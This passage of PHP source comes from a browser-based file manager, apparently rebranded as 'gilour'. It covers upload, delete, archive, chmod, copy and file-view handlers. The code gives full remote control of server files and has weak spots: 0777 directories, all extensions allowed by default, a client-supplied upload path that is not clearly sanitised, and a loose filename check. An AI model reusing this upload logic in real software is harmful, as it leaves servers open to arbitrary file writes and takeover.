    $allowed = (FM_UPLOAD_EXTENSION) ? explode(',', FM_UPLOAD_EXTENSION) : false;
    $response = array (
        'status' => 'error',
        'info'   => 'Oops! Try again'
    );

    $filename = $f['file']['name'];
    $tmp_name = $f['file']['tmp_name'];
    $ext = pathinfo($filename, PATHINFO_FILENAME) != '' ? strtolower(pathinfo($filename, PATHINFO_EXTENSION)) : '';
    $isFileAllowed = ($allowed) ? in_array($ext, $allowed) : true;

    if(!fm_isvalid_filename($filename) and !fm_isvalid_filename($fullPathInput)) {
        $response = array (
            'status'    => 'error',
            'info'      => "Invalid File name!",
        );
        echo json_encode($response); exit();
    }

    $targetPath = $path . $ds;
    if ( is_writable($targetPath) ) {
        $fullPath = $path . '/' . $fullPathInput;
        $folder = substr($fullPath, 0, strrpos($fullPath, "/"));

        if (!is_dir($folder)) {
            $old = umask(0);
            mkdir($folder, 0777, true);
            umask($old);
        }
        if (empty($f['file']['error']) and !empty($tmp_name) and $tmp_name != 'none' and $isFileAllowed) {
            if ($chunkTotal){
                $out = @fopen("{$fullPath}.part", $chunkIndex == 0 ? "wb" : "ab");
                if ($out) {
                    $in = @fopen($tmp_name, "rb");
                    if ($in) {
                        if (PHP_VERSION_ID < 80009) {
                            do {
                                for (;;) {
                                    $buff = fread($in, 4096);
                                    if ($buff === false || $buff === '') {
                                        break;
                                    }
                                    fwrite($out, $buff);
                                }
                            } while (!feof($in));
                        } else {
                            stream_copy_to_stream($in, $out);
                        }
                        $response = array (
                            'status'    => 'success',
                            'info' => "file upload successful"
                        );
                    } else {
                        $response = array (
                        'status'    => 'error',
                        'info' => "failed to open output stream",
                        'errorDetails' => error_get_last()
                        );
                    }
                    @fclose($in);
                    @fclose($out);
                    @unlink($tmp_name);

                    $response = array (
                        'status'    => 'success',
                        'info' => "file upload successful"
                    );
                } else {
                    $response = array (
                        'status'    => 'error',
                        'info' => "failed to open output stream"
                        );
                }

                if ($chunkIndex == $chunkTotal - 1) {
                    if (file_exists ($fullPath)) {
                        $ext_1 = $ext ? '.'.$ext : '';
                        $fullPathTarget = $path . '/' . basename($fullPathInput, $ext_1) .'_'. date('ymdHis'). $ext_1;
                    } else {
                        $fullPathTarget = $fullPath;
                    }
                    rename("{$fullPath}.part", $fullPathTarget);
                }

            } else {
                if (rename($tmp_name, $fullPath)) {
                    if ( file_exists($fullPath) ) {
                        $response = array (
                            'status'    => 'success',
                            'info' => "file upload successful"
                        );
                    } else {
                        $response = array (
                            'status' => 'error',
                            'info'   => 'Couldn\'t upload the requested file.'
                        );
                    }
                } else {
                    $response = array (
                        'status'    => 'error',
                        'info'      => "Error while uploading files. Uploaded files $uploads",
                    );
                }
            }
        }
    } else {
        $response = array (
            'status' => 'error',
            'info'   => 'The specified folder for upload isn\'t writeable.'
        );
    }
    // Return the response
    echo json_encode($response);
    exit();
}


if (isset($_POST['group'], $_POST['delete'], $_POST['token']) and !FM_READONLY) {

    if(!verifyToken($_POST['token'])) {
        fm_set_msg(lng("Invalid Token."), 'error');
    }

    $path = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $path .= '/' . FM_PATH;
    }

    $errors = 0;
    $files = $_POST['file'];
    if (is_array($files) and count($files)) {
        foreach ($files as $f) {
            if ($f != '') {
                $new_path = $path . '/' . $f;
                if (!fm_rdelete($new_path)) {
                    $errors++;
                }
            }
        }
        if ($errors == 0) {
            fm_set_msg(lng('Selected files and folder deleted'));
        } else {
            fm_set_msg(lng('Error while deleting items'), 'error');
        }
    } else {
        fm_set_msg(lng('Nothing selected'), 'alert');
    }

    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
}


if (isset($_POST['group'], $_POST['token']) and (isset($_POST['zip']) || isset($_POST['tar'])) and !FM_READONLY) {

    if(!verifyToken($_POST['token'])) {
        fm_set_msg(lng("Invalid Token."), 'error');
    }

    $path = FM_ROOT_PATH;
    $ext = 'zip';
    if (FM_PATH != '') {
        $path .= '/' . FM_PATH;
    }

    //set pack type
    $ext = isset($_POST['tar']) ? 'tar' : 'zip';

    if (($ext == "zip" and !class_exists('ZipArchive')) || ($ext == "tar" and !class_exists('PharData'))) {
        fm_set_msg(lng('Operations with archives are not available'), 'error');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
    }

    $files = $_POST['file'];
    $sanitized_files = array();

    // clean path
    foreach($files as $file){
        array_push($sanitized_files, fm_clean_path($file));
    }
    
    $files = $sanitized_files;
    
    if (!empty($files)) {
        chdir($path);

        if (count($files) == 1) {
            $one_file = reset($files);
            $one_file = basename($one_file);
            $zipname = $one_file . '_' . date('ymd_His') . '.'.$ext;
        } else {
            $zipname = 'archive_' . date('ymd_His') . '.'.$ext;
        }

        if($ext == 'zip') {
            $zipper = new FM_Zipper();
            $res = $zipper->create($zipname, $files);
        } elseif ($ext == 'tar') {
            $tar = new FM_Zipper_Tar();
            $res = $tar->create($zipname, $files);
        }

        if ($res) {
            fm_set_msg(sprintf(lng('Archive').' <b>%s</b> '.lng('Created'), fanco($zipname)));
        } else {
            fm_set_msg(lng('Archive not created'), 'error');
        }
    } else {
        fm_set_msg(lng('Nothing selected'), 'alert');
    }

    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
}

// Unpack zip, tar
if (isset($_POST['unzip'], $_POST['token']) and !FM_READONLY) {

    if(!verifyToken($_POST['token'])) {
        fm_set_msg(lng("Invalid Token."), 'error');
    }

    $unzip = urldecode($_POST['unzip']);
    $unzip = fm_clean_path($unzip);
    $unzip = str_replace('/', '', $unzip);
    $isValid = false;

    $path = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $path .= '/' . FM_PATH;
    }

    if ($unzip != '' and is_file($path . '/' . $unzip)) {
        $zip_path = $path . '/' . $unzip;
        $ext = pathinfo($zip_path, PATHINFO_EXTENSION);
        $isValid = true;
    } else {
        fm_set_msg(lng('File not found'), 'error');
    }

    if (($ext == "zip" and !class_exists('ZipArchive')) || ($ext == "tar" and !class_exists('PharData'))) {
        fm_set_msg(lng('Operations with archives are not available'), 'error');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
    }

    if ($isValid) {
        //to folder
        $tofolder = '';
        if (isset($_POST['tofolder'])) {
            $tofolder = pathinfo($zip_path, PATHINFO_FILENAME);
            if (fm_mkdir($path . '/' . $tofolder, true)) {
                $path .= '/' . $tofolder;
            }
        }

        if($ext == "zip") {
            $zipper = new FM_Zipper();
            $res = $zipper->unzip($zip_path, $path);
        } elseif ($ext == "tar") {
            try {
                $gzipper = new PharData($zip_path);
                if (@$gzipper->extractTo($path,null, true)) {
                    $res = true;
                } else {
                    $res = false;
                }
            } catch (Exception $e) {

                $res = true;
            }
        }

        if ($res) {
            fm_set_msg(lng('Archive unpacked'));
        } else {
            fm_set_msg(lng('Archive not unpacked'), 'error');
        }
    } else {
        fm_set_msg(lng('File not found'), 'error');
    }
    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
}


if (isset($_POST['chmod'], $_POST['token']) and !FM_READONLY and !FM_IS_WIN) {

    if(!verifyToken($_POST['token'])) {
        fm_set_msg(lng("Invalid Token."), 'error');
    }
    
    $path = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $path .= '/' . FM_PATH;
    }

    $file = $_POST['chmod'];
    $file = fm_clean_path($file);
    $file = str_replace('/', '', $file);
    if ($file == '' || (!is_file($path . '/' . $file) and !is_dir($path . '/' . $file))) {
        fm_set_msg(lng('File not found'), 'error');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
    }

    $mode = 0;
    if (!empty($_POST['ur'])) {
        $mode |= 0400;
    }
    if (!empty($_POST['uw'])) {
        $mode |= 0200;
    }
    if (!empty($_POST['ux'])) {
        $mode |= 0100;
    }
    if (!empty($_POST['gr'])) {
        $mode |= 0040;
    }
    if (!empty($_POST['gw'])) {
        $mode |= 0020;
    }
    if (!empty($_POST['gx'])) {
        $mode |= 0010;
    }
    if (!empty($_POST['or'])) {
        $mode |= 0004;
    }
    if (!empty($_POST['ow'])) {
        $mode |= 0002;
    }
    if (!empty($_POST['ox'])) {
        $mode |= 0001;
    }

    if (@chmod($path . '/' . $file, $mode)) {
        fm_set_msg(lng('Permissions changed'));
    } else {
        fm_set_msg(lng('Permissions not changed'), 'error');
    }

    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
}


$path = FM_ROOT_PATH;
if (FM_PATH != '') {
    $path .= '/' . FM_PATH;
}

if (!is_dir($path)) {
    fm_redirect(FM_SELF_URL . '?p=');
}

$parent = fm_get_parent_path(FM_PATH);

$objects = is_readable($path) ? scandir($path) : array();
$folders = array();
$files = array();
$current_path = array_slice(explode("/",$path), -1)[0];
if (is_array($objects) and fm_is_exclude_items($current_path)) {
    foreach ($objects as $file) {
        if ($file == '.' || $file == '..') {
            continue;
        }
        if (!FM_SHOW_HIDDEN and substr($file, 0, 1) === '.') {
            continue;
        }
        $new_path = $path . '/' . $file;
        if (@is_file($new_path) and fm_is_exclude_items($file)) {
            $files[] = $file;
        } elseif (@is_dir($new_path) and $file != '.' and $file != '..' and fm_is_exclude_items($file)) {
            $folders[] = $file;
        }
    }
}

if (!empty($files)) {
    natcasesort($files);
}
if (!empty($folders)) {
    natcasesort($folders);
}

if (isset($_GET['upload']) and !FM_READONLY) {
    fm_show_header(); 
    fm_show_nav_path(FM_PATH); 
    function getUploadExt() {
        $extArr = explode(',', FM_UPLOAD_EXTENSION);
        if(FM_UPLOAD_EXTENSION and $extArr) {
            array_walk($extArr, function(&$x) {$x = ".$x";});
            return implode(',', $extArr);
        }
        return '';
    }
    ?>
    <?php print_external('css-dropzone'); ?>
    <div class="path">

        <div class="card mb-2 fm-upload-wrapper <?php echo fm_get_theme(); ?>">
            <div class="card-header">
                <ul class="nav nav-tabs card-header-tabs">
                    <li class="nav-item">
                        <a class="nav-link active" href="#fileUploader" data-target="#fileUploader"><i class="fa fa-arrow-circle-o-up"></i> <?php echo lng('UploadingFiles') ?></a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#urlUploader" class="js-url-upload" data-target="#urlUploader"><i class="fa fa-link"></i> <?php echo lng('Upload from URL') ?></a>
                    </li>
                </ul>
            </div>
            <div class="card-body">
                <p class="card-text">
                    <a href="?p=<?php echo FM_PATH ?>" class="float-right"><i class="fa fa-chevron-circle-left go-back"></i> <?php echo lng('Back')?></a>
                    <strong><?php echo lng('DestinationFolder') ?></strong>: <?php echo fanco(fm_convert_win(FM_PATH)) ?>
                </p>

                <form action="<?php echo htmlspecialchars(FM_SELF_URL) . '?p=' . fanco(FM_PATH) ?>" class="dropzone card-tabs-container" id="fileUploader" enctype="multipart/form-data">
                    <input type="hidden" name="p" value="<?php echo fanco(FM_PATH) ?>">
                    <input type="hidden" name="fullpath" id="fullpath" value="<?php echo fanco(FM_PATH) ?>">
                    <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
                    <div class="fallback">
                        <input name="file" type="file" multiple/>
                    </div>
                </form>

                <div class="upload-url-wrapper card-tabs-container hidden" id="urlUploader">
                    <form id="js-form-url-upload" class="row row-cols-lg-auto g-3 align-items-center" onsubmit="return upload_from_url(this);" method="POST" action="">
                        <input type="hidden" name="type" value="upload" aria-label="hidden" aria-hidden="true">
                        <input type="url" placeholder="URL" name="uploadurl" required class="form-control" style="width: 80%">
                        <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
                        <button type="submit" class="btn btn-primary ms-3"><?php echo lng('Upload') ?></button>
                        <div class="lds-facebook"><div></div><div></div><div></div></div>
                    </form>
                    <div id="js-url-upload__list" class="col-9 mt-3"></div>
                </div>
            </div>
        </div>
    </div>
    <?php print_external('js-dropzone'); ?>
    <script>
        Dropzone.options.fileUploader = {
            chunking: true,
            chunkSize: <?php echo UPLOAD_CHUNK_SIZE; ?>,
            forceChunking: true,
            retryChunks: true,
            retryChunksLimit: 3,
            parallelUploads: 1,
            parallelChunkUploads: false,
            timeout: 120000,
            maxFilesize: "<?php echo MAX_UPLOAD_SIZE; ?>",
            acceptedFiles : "<?php echo getUploadExt() ?>",
            init: function () {
                this.on("sending", function (file, xhr, formData) {
                    let _path = (file.fullPath) ? file.fullPath : file.name;
                    document.getElementById("fullpath").value = _path;
                    xhr.ontimeout = (function() {
                        toast('Error: Server Timeout');
                    });
                }).on("success", function (res) {
                    try {
                        let _response = JSON.parse(res.xhr.response);

                        if(_response.status == "error") {
                            toast(_response.info);
                        }
                    } catch (e) {
                        toast("Error: Invalid JSON response");
                    }
                }).on("error", function(file, response) {
                    toast(response);
                });
            }
        }
    </script>
    <?php
    fm_show_footer();
    exit;
}

if (isset($_POST['copy']) and !FM_READONLY) {
    $copy_files = isset($_POST['file']) ? $_POST['file'] : null;
    if (!is_array($copy_files) || empty($copy_files)) {
        fm_set_msg(lng('Nothing selected'), 'alert');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
    }

    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path
    ?>
    <div class="path">
        <div class="card <?php echo fm_get_theme(); ?>">
            <div class="card-header">
                <h6><?php echo lng('Copying') ?></h6>
            </div>
            <div class="card-body">
                <form action="" method="post">
                    <input type="hidden" name="p" value="<?php echo fanco(FM_PATH) ?>">
                    <input type="hidden" name="finish" value="1">
                    <?php
                    foreach ($copy_files as $cf) {
                        echo '<input type="hidden" name="file[]" value="' . fanco($cf) . '">' . PHP_EOL;
                    }
                    ?>
                    <p class="break-word"><strong><?php echo lng('Files') ?></strong>: <b><?php echo implode('</b>, <b>', $copy_files) ?></b></p>
                    <p class="break-word"><strong><?php echo lng('SourceFolder') ?></strong>: <?php echo fanco(fm_convert_win(FM_ROOT_PATH . '/' . FM_PATH)) ?><br>
                        <label for="inp_copy_to"><strong><?php echo lng('DestinationFolder') ?></strong>:</label>
                        <?php echo FM_ROOT_PATH ?>/<input type="text" name="copy_to" id="inp_copy_to" value="<?php echo fanco(FM_PATH) ?>">
                    </p>
                    <p class="custom-checkbox custom-control"><input type="checkbox" name="move" value="1" id="js-move-files" class="custom-control-input"><label for="js-move-files" class="custom-control-label ms-2"> <?php echo lng('Move') ?></label></p>
                    <p>
                        <b><a href="?p=<?php echo urlencode(FM_PATH) ?>" class="btn btn-outline-danger"><i class="fa fa-times-circle"></i> <?php echo lng('Cancel') ?></a></b>&nbsp;
                        <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php echo lng('Copy') ?></button> 
                    </p>
                </form>
            </div>
        </div>
    </div>
    <?php
    fm_show_footer();
    exit;
}

if (isset($_GET['copy']) and !isset($_GET['finish']) and !FM_READONLY) {
    $copy = $_GET['copy'];
    $copy = fm_clean_path($copy);
    if ($copy == '' || !file_exists(FM_ROOT_PATH . '/' . $copy)) {
        fm_set_msg(lng('File not found'), 'error');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
    }

    fm_show_header(); 
    fm_show_nav_path(FM_PATH); 
    ?>
    <div class="path">
        <p><b>Copying</b></p>
        <p class="break-word">
            <strong>Source path:</strong> <?php echo fanco(fm_convert_win(FM_ROOT_PATH . '/' . $copy)) ?><br>
            <strong>Destination folder:</strong> <?php echo fanco(fm_convert_win(FM_ROOT_PATH . '/' . FM_PATH)) ?>
        </p>
        <p>
            <b><a href="?p=<?php echo urlencode(FM_PATH) ?>&amp;copy=<?php echo urlencode($copy) ?>&amp;finish=1"><i class="fa fa-check-circle"></i> Copy</a></b> &nbsp;
            <b><a href="?p=<?php echo urlencode(FM_PATH) ?>&amp;copy=<?php echo urlencode($copy) ?>&amp;finish=1&amp;move=1"><i class="fa fa-check-circle"></i> Move</a></b> &nbsp;
            <b><a href="?p=<?php echo urlencode(FM_PATH) ?>" class="text-danger"><i class="fa fa-times-circle"></i> Cancel</a></b>
        </p>
        <p><i><?php echo lng('Select folder') ?></i></p>
        <ul class="folders break-word">
            <?php
            if ($parent !== false) {
                ?>
                <li><a href="?p=<?php echo urlencode($parent) ?>&amp;copy=<?php echo urlencode($copy) ?>"><i class="fa fa-chevron-circle-left"></i> ..</a></li>
                <?php
            }
            foreach ($folders as $f) {
                ?>
                <li>
                    <a href="?p=<?php echo urlencode(trim(FM_PATH . '/' . $f, '/')) ?>&amp;copy=<?php echo urlencode($copy) ?>"><i class="fa fa-folder-o"></i> <?php echo fm_convert_win($f) ?></a></li>
                <?php
            }
            ?>
        </ul>
    </div>
    <?php
    fm_show_footer();
    exit;
}

if (isset($_GET['settings']) and !FM_READONLY) {
    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path
    global $cfg, $lang, $lang_list;
    ?>

    <div class="col-md-8 offset-md-2 pt-3">
        <div class="card mb-2 <?php echo fm_get_theme(); ?>">
            <h6 class="card-header d-flex justify-content-between">
                <span><i class="fa fa-cog"></i>  <?php echo lng('Settings') ?></span>
                <a href="?p=<?php echo FM_PATH ?>" class="text-danger"><i class="fa fa-times-circle-o"></i> <?php echo lng('Cancel')?></a>
            </h6>
            <div class="card-body">
                <form id="js-settings-form" action="" method="post" data-type="ajax" onsubmit="return save_settings(this)">
                    <input type="hidden" name="type" value="settings" aria-label="hidden" aria-hidden="true">
                    <div class="form-group row">
                        <label for="js-language" class="col-sm-3 col-form-label"><?php echo lng('Language') ?></label>
                        <div class="col-sm-5">
                            <select class="form-select" id="js-language" name="js-language">
                                <?php
                                function getSelected($l) {
                                    global $lang;
                                    return ($lang == $l) ? 'selected' : '';
                                }
                                foreach ($lang_list as $k => $v) {
                                    echo "<option value='$k' ".getSelected($k).">$v</option>";
                                }
                                ?>
                            </select>
                        </div>
                    </div>
                    <div class="mt-3 mb-3 row ">
                        <label for="js-error-report" class="col-sm-3 col-form-label"><?php echo lng('ErrorReporting') ?></label>
                        <div class="col-sm-9">
                            <div class="form-check form-switch">
                              <input class="form-check-input" type="checkbox" role="switch" id="js-error-report" name="js-error-report" value="true" <?php echo $report_errors ? 'checked' : ''; ?> />
                            </div>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <label for="js-show-hidden" class="col-sm-3 col-form-label"><?php echo lng('ShowHiddenFiles') ?></label>
                        <div class="col-sm-9">
                            <div class="form-check form-switch">
                              <input class="form-check-input" type="checkbox" role="switch" id="js-show-hidden" name="js-show-hidden" value="true" <?php echo $show_hidden_files ? 'checked' : ''; ?> />
                            </div>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <label for="js-hide-cols" class="col-sm-3 col-form-label"><?php echo lng('HideColumns') ?></label>
                        <div class="col-sm-9">
                            <div class="form-check form-switch">
                              <input class="form-check-input" type="checkbox" role="switch" id="js-hide-cols" name="js-hide-cols" value="true" <?php echo $hide_Cols ? 'checked' : ''; ?> />
                            </div>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <label for="js-3-1" class="col-sm-3 col-form-label"><?php echo lng('Theme') ?></label>
                        <div class="col-sm-5">
                            <select class="form-select w-100" id="js-3-0" name="js-theme-3">
                                <option value='light' <?php if($theme == "light"){echo "selected";} ?>><?php echo lng('light') ?></option>
                                <option value='dark' <?php if($theme == "dark"){echo "selected";} ?>><?php echo lng('dark') ?></option>
                            </select>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <div class="col-sm-10">
                            <button type="submit" class="btn btn-success"> <i class="fa fa-check-circle"></i> <?php echo lng('Save'); ?></button>
                        </div>
                    </div>

                </form>
            </div>
        </div>
    </div>
    <?php
    fm_show_footer();
    exit;
}

if (isset($_GET['help'])) {
    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path
    global $cfg, $lang;
    ?>

    <div class="col-md-8 offset-md-2 pt-3">
        <div class="card mb-2 <?php echo fm_get_theme(); ?>">
            <h6 class="card-header d-flex justify-content-between">
                <span><i class="fa fa-exclamation-circle"></i> <?php echo lng('Help') ?></span>
                <a href="?p=<?php echo FM_PATH ?>" class="text-danger"><i class="fa fa-times-circle-o"></i> <?php echo lng('Cancel')?></a>
            </h6>
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p><h3><a href="." target="_blank" class="app-v-title"> gilour <?php echo VERSION; ?></a></h3></p>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="." target="_blank"><i class="fa fa-question-circle"></i> <?php echo lng('Help Documents') ?> </a> </li>
                                <li class="list-group-item"><a href="." target="_blank"><i class="fa fa-bug"></i> <?php echo lng('Report Issue') ?></a></li>
                                <?php if(!FM_READONLY) { ?>
                                <li class="list-group-item"><a href="javascript:show_new_pwd();"><i class="fa fa-lock"></i> <?php echo lng('Generate new password hash') ?></a></li>
                                <?php } ?>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="row js-new-pwd hidden mt-2">
                    <div class="col-12">
                        <form class="form-inline" onsubmit="return new_password_hash(this)" method="POST" action="">
                            <input type="hidden" name="type" value="pwdhash" aria-label="hidden" aria-hidden="true">
                            <div class="form-group mb-2">
                                <label for="staticEmail2"><?php echo lng('Generate new password hash') ?></label>
                            </div>
                            <div class="form-group mx-sm-3 mb-2">
                                <label for="inputPassword2" class="sr-only"><?php echo lng('Password') ?></label>
                                <input type="text" class="form-control btn-sm" id="inputPassword2" name="inputPassword2" placeholder="<?php echo lng('Password') ?>" required>
                            </div>
                            <button type="submit" class="btn btn-success btn-sm mb-2"><?php echo lng('Generate') ?></button>
                        </form>
                        <textarea class="form-control" rows="2" readonly id="js-pwd-result"></textarea>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <?php
    fm_show_footer();
    exit;
}

if (isset($_GET['view'])) {
    $file = $_GET['view'];
    $file = fm_clean_path($file, false);
    $file = str_replace('/', '', $file);
    if ($file == '' || !is_file($path . '/' . $file) || !fm_is_exclude_items($file)) {
        fm_set_msg(lng('File not found'), 'error');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
    }

    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path

    $file_url = FM_ROOT_URL . fm_convert_win((FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $file);
    $file_path = $path . '/' . $file;

    $ext = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
    $mime_type = fm_get_mime_type($file_path);
    $filesize_raw = fm_get_size($file_path);
    $filesize = fm_get_filesize($filesize_raw);

    $is_zip = false;
    $is_gzip = false;
    $is_image = false;
    $is_audio = false;
    $is_video = false;
    $is_text = false;
    $is_onlineViewer = false;

    $view_title = 'File';
    $filenames = false; // for zip
    $content = ''; // for text
    $online_viewer = strtolower(FM_DOC_VIEWER);

    if($online_viewer and $online_viewer !== 'false' and in_array($ext, fm_get_onlineViewer_exts())){
        $is_onlineViewer = true;
    }
    elseif ($ext == 'zip' || $ext == 'tar') {
        $is_zip = true;
        $view_title = 'Archive';
        $filenames = fm_get_zif_info($file_path, $ext);
    } elseif (in_array($ext, fm_get_image_exts())) {
        $is_image = true;
        $view_title = 'Image';
    } elseif (in_array($ext, fm_get_audio_exts())) {
        $is_audio = true;
        $view_title = 'Audio';
    } elseif (in_array($ext, fm_get_video_exts())) {
        $is_video = true;
        $view_title = 'Video';
    } elseif (in_array($ext, fm_get_text_exts()) || substr($mime_type, 0, 4) == 'text' || in_array($mime_type, fm_get_text_mimes())) {
        $is_text = true;
        $content = file_get_contents($file_path);
    }

    ?>
    <div class="row">
        <div class="col-12">
            <p class="break-word"><b><?php echo lng($view_title) ?> "<?php echo fanco(fm_convert_win($file)) ?>"</b></p>
            <p class="break-word">
                <?php $display_path = fm_get_display_path($file_path); ?>
                <strong><?php echo $display_path['label']; ?>:</strong> <?php echo $display_path['path']; ?><br>
                <strong>File size:</strong> <?php echo ($filesize_raw <= 1000) ? "$filesize_raw bytes" : $filesize; ?><br>
                <strong>MIME-type:</strong> <?php echo $mime_type ?><br>
                <?php
                // ZIP info
                if (($is_zip || $is_gzip) and $filenames !== false) {
                    $total_files = 0;
                    $total_comp = 0;
                    $total_uncomp = 0;
                    foreach ($filenames as $fn) {
                        if (!$fn['folder']) {
                            $total_files++;
                        }
                        $total_comp += $fn['compressed_size'];
                        $total_uncomp += $fn['filesize'];
                    }
                    ?>
                    <?php echo lng('Files in archive') ?>: <?php echo $total_files ?><br>
                    <?php echo lng('Total size') ?>: <?php echo fm_get_filesize($total_uncomp) ?><br>
                    <?php echo lng('Size in archive') ?>: <?php echo fm_get_filesize($total_comp) ?><br>
                    <?php echo lng('Compression') ?>: <?php echo round(($total_comp / max($total_uncomp, 1)) * 100) ?>%<br>
                    <?php
                }
                // Image info
                if ($is_image) {
                    $image_size = getimagesize($file_path);
                    echo '<strong>'.lng('Image size').':</strong> ' . (isset($image_size[0]) ? $image_size[0] : '0') . ' x ' . (isset($image_size[1]) ? $image_size[1] : '0') . '<br>';
                }
                // Text info
                if ($is_text) {
                    $is_utf8 = fm_is_utf8($content);
                    if (function_exists('iconv')) {
                        if (!$is_utf8) {
                            $content = iconv(FM_ICONV_INPUT_ENC, 'UTF-8//IGNORE', $content);
                        }
                    }
                    echo '<strong>'.lng('Charset').':</strong> ' . ($is_utf8 ? 'utf-8' : '8 bit') . '<br>';
                }
                ?>
            </p>
            <div class="d-flex align-items-center mb-3">
                <form method="post" class="d-inline ms-2" action="?p=<?php echo urlencode(FM_PATH) ?>&amp;dl=<?php echo urlencode($file) ?>">
                    <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
                    <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0"><i class="fa fa-cloud-download"></i> <?php echo lng('Download') ?></button> &nbsp;
                </form>
                <b class="ms-2"><a href="<?php echo fanco($file_url) ?>" target="_blank"><i class="fa fa-external-link-square"></i> <?php echo lng('Open') ?></a></b>
                <?php
                // ZIP actions
                if (!FM_READONLY and ($is_zip || $is_gzip) and $filenames !== false) {
                    $zip_name = pathinfo($file_path, PATHINFO_FILENAME);
                    ?>
                    <form method="post" class="d-inline ms-2">
                        <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
                        <input type="hidden" name="unzip" value="<?php echo urlencode($file); ?>">
                        <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0" style="font-size: 14px;"><i class="fa fa-check-circle"></i> <?php echo lng('UnZip') ?></button>
                    </form>&nbsp;
                    <form method="post" class="d-inline ms-2">
                        <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
                        <input type="hidden" name="unzip" value="<?php echo urlencode($file); ?>">
                        <input type="hidden" name="tofolder" value="1">
                        <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0" style="font-size: 14px;" title="UnZip to <?php echo fanco($zip_name) ?>"><i class="fa fa-check-circle"></i> <?php echo lng('UnZipToFolder') ?></button>
                    </form>&nbsp;
                    <?php
                }
                if ($is_text and !FM_READONLY) {
                    ?>
                    <b class="ms-2"><a href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php echo urlencode($file) ?>" class="edit-file"><i class="fa fa-pencil-square"></i> <?php echo lng('Edit') ?>
                        </a></b> &nbsp;
                    <b class="ms-2"><a href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php echo urlencode($file) ?>&env=ace"
                            class="edit-file"><i class="fa fa-pencil-square-o"></i> <?php echo lng('AdvancedEditor') ?>
                        </a></b> &nbsp;
                <?php } ?>
                <b class="ms-2"><a href="?p=<?php echo urlencode(FM_PATH) ?>"><i class="fa fa-chevron-circle-left go-back"></i> <?php echo lng('Back') ?></a></b>
            </div>
            <?php
            if($is_onlineViewer) {
                if($online_viewer == 'google') {
                    echo '<iframe src="https://docs.google.com/viewer?embedded=true&hl=en&url=' . fanco($file_url) . '" frameborder="no" style="width:100%;min-height:460px"></iframe>';
                } else if($online_viewer == 'microsoft') {
                    echo '<iframe src="https://view.officeapps.live.com/op/embed.aspx?src=' . fanco($file_url) . '" frameborder="no" style="width:100%;min-height:460px"></iframe>';
                }
            } elseif ($is_zip) {
                // ZIP content
                if ($filenames !== false) {
                    echo '<code class="maxheight">';
                    foreach ($filenames as $fn) {
                        if ($fn['folder']) {
                            echo '<b>' . fanco($fn['name']) . '</b><br>';
                        } else {
                            echo $fn['name'] . ' (' . fm_get_filesize($fn['filesize']) . ')<br>';
                        }
                    }
                    echo '</code>';
                } else {
                    echo '<p>'.lng('Error while fetching archive info').'</p>';
                }
            } elseif ($is_image) {
                // Image content
                if (in_array($ext, array('gif', 'jpg', 'jpeg', 'png', 'bmp', 'ico', 'svg', 'webp', 'avif'))) {
                    echo '<p><input type="checkbox" id="preview-img-zoomCheck"><label for="preview-img-zoomCheck"><img src="' . fanco($file_url) . '" alt="image" class="preview-img"></label></p>';
                }
            } elseif ($is_audio) {
                // Audio content
                echo '<p><audio src="' . fanco($file_url) . '" controls preload="metadata"></audio></p>';
            } elseif ($is_video) {
                // Video content
                echo '<div class="preview-video"><video src="' . fanco($file_url) . '" width="640" height="360" controls preload="metadata"></video></div>';
            } elseif ($is_text) {
                if (FM_USE_HIGHLIGHTJS) {
                    // highlight
                    $hljs_classes = array(
                        'shtml' => 'xml',
                        'htaccess' => 'apache',
                        'phtml' => 'php',
                        'lock' => 'json',
                        'svg' => 'xml',
                    );
                    $hljs_class = isset($hljs_classes[$ext]) ? 'lang-' . $hljs_classes[$ext] : 'lang-' . $ext;
